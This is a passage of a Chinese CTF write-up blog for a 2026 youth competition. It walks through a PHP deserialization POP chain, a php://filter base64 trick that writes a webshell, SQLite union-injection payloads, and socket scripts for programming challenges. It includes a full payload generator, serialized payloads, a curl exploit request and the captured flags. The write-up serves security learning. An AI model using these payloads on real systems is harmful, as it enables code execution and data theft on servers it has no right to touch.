<p>在正常的代码逻辑里（看 <code>__construct</code>），它是一个 <code>Logger</code> 对象：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;System normal. No alert needed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果 <code>$this-&gt;reporter</code> 是 <code>Logger</code>，调用 <code>alert()</code> 只会打印一句话，<strong>没有危害</strong>。</p>
<p><strong>但是！</strong> 作为攻击者，我们可以控制序列化数据。我们可以把 <code>$this-&gt;reporter</code> 换成<strong>任何拥有 <code>alert()</code> 方法的对象</strong>。</p>
<p>我们在代码里搜索 <code>alert</code>，发现了 <code>Screen</code> 类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$format</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 这里的调用看起来像是一个格式化输出</span></span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;format;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>(<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果我们将 <code>Monitor</code> 的 <code>$reporter</code> 属性设置为一个 <code>Screen</code> 对象…</li>
<li>那么 <code>Monitor::__destruct()</code> 就会去调用 <code>Screen::alert()</code>。</li>
<li>在 <code>Screen::alert()</code> 中：<code>$func($this-&gt;content)</code> 是一个<strong>动态函数调用</strong>。</li>
<li>如果我们控制了 <code>$format</code> 和 <code>$content</code>，我们就控制了执行什么函数！</li>
</ul>
<p>第四步：构造终点</p>
<p>我们的目标是读取根目录下的 FLAG。</p>
<p>在 <code>Screen::alert()</code> 中：</p>
<ul>
<li>令 <code>$this-&gt;format = &quot;system&quot;</code></li>
<li>令 <code>$this-&gt;content = &quot;cat /flag&quot;</code></li>
<li>执行结果就是：<code>system(&quot;cat /flag&quot;)</code> -&gt; <strong>代码执行成功！</strong><br>
第五步：绕过过滤（Bypass）</li>
</ul>
<p>回到入口处，我们发现有一个正则检查：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No flag here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它禁止输入字符串中包含 <code>flag</code>（不区分大小写）。</p>
<p><strong>绕过技巧</strong>：<br>
在 Linux Shell 命令中，我们可以使用通配符。</p>
<ul>
<li><code>cat /flag</code> -&gt; 被拦截</li>
<li><code>cat /f*</code> -&gt; 匹配 <code>/f</code> 开头的文件（即 <code>/flag</code>），<strong>成功绕过</strong>。</li>
</ul>
<p>所以，我们的 <code>$content</code> 应该设置为 <code>&quot;cat /f*&quot;</code>。<br>
第六步：处理私有属性（Private Properties）</p>
<p>最后看一眼 <code>Monitor</code> 类的定义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$reporter</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>属性是 <code>private</code> 的。在 PHP 序列化中：</p>
<ul>
<li><code>public</code> 属性名直接存储：<code>name</code></li>
<li><code>protected</code> 属性名存储为：<code>\0*\0name</code></li>
<li><code>private</code> 属性名存储为：<code>\0ClassName\0name</code></li>
</ul>
<p>这里的 <code>\0</code> 代表 ASCII 码为 0 的空字符（Null Byte）。因为我们在文本编辑器里打不出空字符，所以直接手写序列化字符串很容易出错。</p>
<p><strong>最佳实践</strong>：<br>
使用 PHP 脚本来生成 Payload，而不是手写。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 模拟环境生成 Payload</span></span><br><span class="line"><span class="variable">$screen</span> = <span class="keyword">new</span> <span class="title class_">Screen</span>();</span><br><span class="line"><span class="variable">$screen</span>-&gt;format = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$screen</span>-&gt;content = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$monitor</span> = <span class="keyword">new</span> <span class="title class_">Monitor</span>(); <span class="comment">// 这里没法直接new私有属性，通常用反射或者构造函数</span></span><br><span class="line"><span class="comment">// 但因为我们是在本地写生成脚本，我们可以修改本地的 Monitor 类定义，把 private 改成 public</span></span><br><span class="line"><span class="comment">// 或者添加一个构造函数来赋值，只要生成的序列化字符串格式对就行。</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-5.png" alt="alt text"></p>
<h2 id="serialization"><a class="header-anchor" href="#serialization">¶</a>serialization</h2>
<p>这个解法利用了 PHP 的 <code>php://filter</code> 伪协议结合 <code>convert.base64-decode</code> 过滤器来绕过 <code>exit</code> 语句，成功写入 webshell。</p>
<h3 id="漏洞分析"><a class="header-anchor" href="#漏洞分析">¶</a><strong>漏洞分析</strong></h3>
<p>题目中的 <code>FileCache</code> 类使用 <code>file_put_contents</code> 写文件，但在写入的内容前强制拼接了一个安全头：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$security_header</span> = <span class="string">&#x27;&lt;?php exit(&quot;Access Denied: Protected Cache&quot;); ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>这句代码会导致后续写入的任何 PHP 代码都无法执行（因为脚本会直接退出）。但是，<code>file_put_contents</code> 的文件名参数支持 PHP 伪协议。通过使用 <code>php://filter</code>，我们可以在内容写入文件之前对其进行修改。</p>
<h3 id="利用策略"><a class="header-anchor" href="#利用策略">¶</a><strong>利用策略</strong></h3>
<p>我们可以使用 <code>convert.base64-decode</code> 过滤器。当这个过滤器生效时：</p>
<ol>
<li>它会尝试对整个数据流（Header + 用户内容）进行 Base64 解码。</li>
<li>Header 中的非 Base64 字符（如 <code>&lt; ? &quot; ( ) ; &gt;</code> 和空格）会被忽略。</li>
<li>Header 中的有效 Base64 字符会被解码成乱码（二进制垃圾数据）。</li>
<li>如果我们传入的用户内容是经过 Base64 编码的 PHP 代码，它就会被还原成可执行的 PHP 代码。</li>
</ol>
<p><strong>Base64 对齐问题 (Padding Problem)：</strong><br>
Base64 解码是以 4 个字符为一组进行的。我们需要确保 Header 中的有效 Base64 字符数量加上我们的填充字符，刚好能凑成 4 的倍数，这样我们的 Payload 才能被正确解码，不会和 Header 的字符混在一起。</p>
<p>Header 内容：<code>&lt;?php exit(&quot;Access Denied: Protected Cache&quot;); ?&gt;</code><br>
其中的有效 Base64 字符为：<br>
<code>phpexitAccessDeniedProtectedCache</code><br>
共 <strong>33</strong> 个字符。</p>
<p>计算填充：<code>33 % 4 = 1</code>，因此我们需要补 <strong>3</strong> 个字符（<code>4 - 1 = 3</code>），这里我们使用 <code>AAA</code> 作为填充。</p>
<h3 id="Payload-生成"><a class="header-anchor" href="#Payload-生成">¶</a><strong>Payload 生成</strong></h3>
<p>生成序列化 Payload 的 PHP 代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuditLog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handler</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$handler</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileCache</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filePath</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filePath = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标文件：使用 php://filter 进行 base64 解码写入</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=shell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Payload 内容：填充字符 (AAA) + Base64 编码的 Shell</span></span><br><span class="line"><span class="comment">// 3 个填充字符 + base64(&lt;?php system(&quot;cat /flag&quot;); ?&gt;)</span></span><br><span class="line"><span class="variable">$payload_content</span> = <span class="string">&#x27;AAA&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;&lt;?php system(&quot;cat /flag&quot;); ?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cache</span> = <span class="keyword">new</span> <span class="title class_">FileCache</span>(<span class="variable">$file</span>, <span class="variable">$payload_content</span>);</span><br><span class="line"><span class="variable">$audit</span> = <span class="keyword">new</span> <span class="title class_">AuditLog</span>(<span class="variable">$cache</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$audit</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>生成的 Payload:</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">O:8:&quot;AuditLog&quot;:1:&#123;s:7:&quot;handler&quot;;O:9:&quot;FileCache&quot;:2:&#123;s:8:&quot;filePath&quot;;s:59:&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;;s:7:&quot;content&quot;;s:43:&quot;AAAPD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTsgPz4=&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="执行步骤"><a class="header-anchor" href="#执行步骤">¶</a><strong>执行步骤</strong></h3>
<ol>
<li>
<p><strong>发送 Payload</strong>:<br>
通过 POST 请求发送 Payload 到目标 URL：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST -d <span class="string">&quot;data=O:8:\&quot;AuditLog\&quot;:1:&#123;s:7:\&quot;handler\&quot;;O:9:\&quot;FileCache\&quot;:2:&#123;s:8:\&quot;filePath\&quot;;s:59:\&quot;php://filter/write=convert.base64-decode/resource=shell.php\&quot;;s:7:\&quot;content\&quot;;s:43:\&quot;AAAPD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTsgPz4=\&quot;;&#125;&#125;&quot;</span> http://challenge.qsnctf.com:52885/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>触发 Shell</strong>:<br>
访问生成的 <code>shell.php</code> 文件，它会执行 <code>cat /flag</code>：<br>
<code>http://challenge.qsnctf.com:52885/shell.php</code></p>
</li>
</ol>
<p><strong>最终 Flag:</strong><br>
<code>qsnctf&#123;502be51a0ed848a8b8e6141f1f542ff1&#125;</code></p>
<h2 id=""><a class="header-anchor" href="#">¶</a></h2>
<ol>
<li>
<p><strong>准备工作</strong>：</p>
<ul>
<li>我首先对目标网站 <code>http://challenge.qsnctf.com:52960/</code> 进行了初步探测，使用 <code>curl</code> 获取了首页内容，确认这是一个用户搜索系统。</li>
<li>发现存在一个搜索框，提交的数据通过 <code>POST</code> 请求发送到 <code>/search</code>，参数名为 <code>query</code>。</li>
</ul>
</li>
<li>
<p><strong>SQL 注入测试</strong>：</p>
<ul>
<li>我尝试输入 <code>admin</code>，没有返回结果。</li>
<li>我尝试输入单引号 <code>'</code>，依然没有返回结果。</li>
<li>我尝试输入 <code>admin' or '1'='1</code>，仍然没有返回结果。</li>
<li>我尝试了基于时间的盲注 <code>admin' and sleep(5)#</code> 和 <code>admin' and sleep(5)--</code>，响应时间极短，说明后端数据库可能不是 MySQL，或者不支持 <code>sleep</code> 函数，或者注入点不在此处。</li>
<li>接着，我尝试了 Union 注入 <code>1' union select 1,2,3#</code>，这次返回了错误信息 <code>unrecognized token: &quot;#&quot;</code>。这表明后端数据库很可能是 <strong>SQLite</strong>（因为 <code>#</code> 在 SQLite 中不是注释符，而是 token 的一部分，而 <code>--</code> 是注释符）。</li>
<li>我立即修正 payload 为 <code>1' union select 1,2,3--</code>，成功在页面上回显了 <code>1</code>, <code>2</code>, <code>3</code>，证明存在 <strong>Union 注入漏洞</strong>，且数据库是 SQLite。</li>
</ul>
</li>
<li>
<p><strong>获取数据库结构</strong>：</p>
<ul>
<li>利用 <code>sqlite_master</code> 表查询数据库表名：<code>1' union select 1,sql,3 from sqlite_master--</code>。</li>
<li>查询结果显示存在两个表：<code>flags</code> 和 <code>users</code>。</li>
<li><code>flags</code> 表的结构是 <code>CREATE TABLE flags (id INTEGER PRIMARY KEY AUTOINCREMENT, value TEXT NOT NULL)</code>。</li>
</ul>
</li>
<li>
<p><strong>获取 Flag</strong>：</p>
<ul>
<li>构造 payload 查询 <code>flags</code> 表中的数据：<code>1' union select 1,value,3 from flags--</code>。</li>
<li>成功获取到 Flag。</li>
</ul>
</li>
</ol>
<p><strong>最终结果</strong></p>
<p>Flag 为：<code>qsnctf&#123;e43eb576d9fb420cb6b10637317426e1&#125;</code></p>
<h1>编程</h1>
<h2 id="上下火车"><a class="header-anchor" href="#上下火车">¶</a>上下火车</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置连接信息</span></span><br><span class="line">host = <span class="string">&#x27;challenge.qsnctf.com&#x27;</span></span><br><span class="line">port = <span class="number">55594</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_train</span>(<span class="params">a, n, m, x</span>):</span><br><span class="line">    <span class="comment"># 用来存储每站上车人数中 a 和 u 的系数</span></span><br><span class="line">    <span class="comment"># U_i = up_a[i]*a + up_u[i]*u</span></span><br><span class="line">    up_a = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    up_u = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始站规律</span></span><br><span class="line">    up_a[<span class="number">1</span>], up_u[<span class="number">1</span>] = <span class="number">1</span>, <span class="number">0</span>  <span class="comment"># 第1站上车 a</span></span><br><span class="line">    up_a[<span class="number">2</span>], up_u[<span class="number">2</span>] = <span class="number">0</span>, <span class="number">1</span>  <span class="comment"># 第2站上车 u</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n):</span><br><span class="line">        up_a[i] = up_a[i-<span class="number">1</span>] + up_a[i-<span class="number">2</span>]</span><br><span class="line">        up_u[i] = up_u[i-<span class="number">1</span>] + up_u[i-<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 计算离开每一站时车上的人数 S_i</span></span><br><span class="line">    <span class="comment"># S_i = S_&#123;i-1&#125; + U_&#123;i-2&#125;</span></span><br><span class="line">    sum_a = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    sum_u = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    sum_a[<span class="number">1</span>], sum_u[<span class="number">1</span>] = <span class="number">1</span>, <span class="number">0</span> <span class="comment"># S_1 = a</span></span><br><span class="line">    sum_a[<span class="number">2</span>], sum_u[<span class="number">2</span>] = <span class="number">1</span>, <span class="number">0</span> <span class="comment"># S_2 = a</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n):</span><br><span class="line">        sum_a[i] = sum_a[i-<span class="number">1</span>] + up_a[i-<span class="number">2</span>]</span><br><span class="line">        sum_u[i] = sum_u[i-<span class="number">1</span>] + up_u[i-<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 根据第 n-1 站的总人数 m 解方程: sum_a[n-1]*a + sum_u[n-1]*u = m</span></span><br><span class="line">    <span class="comment"># u = (m - sum_a[n-1]*a) / sum_u[n-1]</span></span><br><span class="line">    u = (m - sum_a[n-<span class="number">1</span>] * a) // sum_u[n-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回目标站 x 的人数</span></span><br><span class="line">    <span class="keyword">return</span> sum_a[x] * a + sum_u[x] * u</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(host, port)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            data = io.recvuntil(<span class="string">b&quot;Your answer&quot;</span>, timeout=<span class="number">5</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(data) <span class="comment"># 打印当前题目信息</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 使用正则提取参数</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                n = <span class="built_in">int</span>(re.search(<span class="string">r&quot;Stations \(n\): (\d+)&quot;</span>, data).group(<span class="number">1</span>))</span><br><span class="line">                a = <span class="built_in">int</span>(re.search(<span class="string">r&quot;Initial \(a\): (\d+)&quot;</span>, data).group(<span class="number">1</span>))</span><br><span class="line">                m = <span class="built_in">int</span>(re.search(<span class="string">r&quot;Total at n-1 \(m\): (\d+)&quot;</span>, data).group(<span class="number">1</span>))</span><br><span class="line">                x = <span class="built_in">int</span>(re.search(<span class="string">r&quot;Target station \(x\): (\d+)&quot;</span>, data).group(<span class="number">1</span>))</span><br><span class="line">                </span><br><span class="line">                ans = solve_train(a, n, m, x)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Calculating: a=<span class="subst">&#123;a&#125;</span>, n=<span class="subst">&#123;n&#125;</span>, m=<span class="subst">&#123;m&#125;</span>, x=<span class="subst">&#123;x&#125;</span> -&gt; Ans: <span class="subst">&#123;ans&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                io.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;解析出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="comment"># 打印最后获取的 flag</span></span><br><span class="line">        <span class="built_in">print</span>(io.recvall().decode())</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="1"><a class="header-anchor" href="#1">¶</a>1</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;challenge.qsnctf.com&#x27;</span></span><br><span class="line">PORT = <span class="number">52266</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pair</span>(<span class="params">nums, target</span>):</span><br><span class="line">    seen = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        complement = target - num</span><br><span class="line">        <span class="keyword">if</span> complement <span class="keyword">in</span> seen:</span><br><span class="line">            <span class="keyword">return</span> (seen[complement], i, complement, num)</span><br><span class="line">        seen[num] = i</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">    buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = s.recv(<span class="number">4096</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 尝试提取列表和目标值</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;List = \[(.*?)\]\s*Target = (\d+)&#x27;</span>, buffer)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            nums_str = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            target = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">            nums = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, nums_str.split(<span class="string">&#x27;,&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">            result = find_pair(nums, target)</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                idx1, idx2, num1, num2 = result</span><br><span class="line">                answer = <span class="string">f&quot;(<span class="subst">&#123;idx1&#125;</span>,<span class="subst">&#123;idx2&#125;</span>,<span class="subst">&#123;num1&#125;</span>,<span class="subst">&#123;num2&#125;</span>)\n&quot;</span></span><br><span class="line">                s.sendall(answer.encode())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Sent: <span class="subst">&#123;answer.strip()&#125;</span>&quot;</span>)</span><br><span class="line">                buffer = <span class="string">&quot;&quot;</span>  <span class="comment"># 清空buffer准备下一轮</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;No valid pair found!&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果服务器说结束</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Bye&quot;</span> <span class="keyword">in</span> buffer <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> buffer.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Server ended or flag received.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(buffer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="2"><a class="header-anchor" href="#2">¶</a>2</h2>
<h2 id="3"><a class="header-anchor" href="#3">¶</a>3</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># roman_auto_v2.py</span></span><br><span class="line"><span class="keyword">import</span> re, socket, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roman_to_int</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;合法罗马数字→整数，不合法返回 -1&quot;&quot;&quot;</span></span><br><span class="line">    s = s.upper()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r&quot;M&#123;0,4&#125;(CM|CD|D?C&#123;0,3&#125;)(XC|XL|L?X&#123;0,3&#125;)(IX|IV|V?I&#123;0,3&#125;)&quot;</span>, s):</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    val = &#123;<span class="string">&quot;I&quot;</span>:<span class="number">1</span>,<span class="string">&quot;V&quot;</span>:<span class="number">5</span>,<span class="string">&quot;X&quot;</span>:<span class="number">10</span>,<span class="string">&quot;L&quot;</span>:<span class="number">50</span>,<span class="string">&quot;C&quot;</span>:<span class="number">100</span>,<span class="string">&quot;D&quot;</span>:<span class="number">500</span>,<span class="string">&quot;M&quot;</span>:<span class="number">1000</span>&#125;</span><br><span class="line">    total, prev = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">reversed</span>(s):</span><br><span class="line">        v = val[ch]</span><br><span class="line">        total += -v <span class="keyword">if</span> v &lt; prev <span class="keyword">else</span> v</span><br><span class="line">        prev = v</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line">HOST, PORT = <span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">52315</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sock = socket.create_connection((HOST, PORT), timeout=<span class="number">15</span>)</span><br><span class="line">    f = sock.makefile(<span class="string">&quot;rwb&quot;</span>, buffering=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = f.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        txt = line.decode(errors=<span class="string">&quot;ignore&quot;</span>).strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&lt;-&quot;</span>, txt)          <span class="comment"># 本地调试可看</span></span><br><span class="line">        <span class="comment"># 仅当整行都是罗马数字（允许前后空白）才回答</span></span><br><span class="line">        <span class="keyword">if</span> re.fullmatch(<span class="string">r&quot;\s*[MDCLXVI]+\s*&quot;</span>, txt, re.I):</span><br><span class="line">            ans = roman_to_int(txt)</span><br><span class="line">            <span class="keyword">if</span> ans != -<span class="number">1</span>:</span><br><span class="line">                reply = <span class="built_in">str</span>(ans) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&gt;&quot;</span>, reply, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                f.write(reply.encode())</span><br><span class="line">                f.flush()</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="4回文数"><a class="header-anchor" href="#4回文数">¶</a>4回文数</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_palindrome</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(n) == <span class="built_in">str</span>(n)[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">&#x27;challenge.qsnctf.com&#x27;</span>, <span class="number">52386</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((host, port), timeout=<span class="number">10</span>) <span class="keyword">as</span> s:</span><br><span class="line">    full = <span class="string">b&#x27;&#x27;</span>                      <span class="comment"># 用来存所有回显</span></span><br><span class="line">    buf  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:               <span class="comment"># 服务器断开</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        buf  += chunk</span><br><span class="line">        full += chunk</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 只要出现 Input&gt; 就回答</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">b&#x27;Input&gt;&#x27;</span> <span class="keyword">in</span> buf:</span><br><span class="line">            head, tail = buf.split(<span class="string">b&#x27;Input&gt;&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">            block = (head + <span class="string">b&#x27;Input&gt;&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span 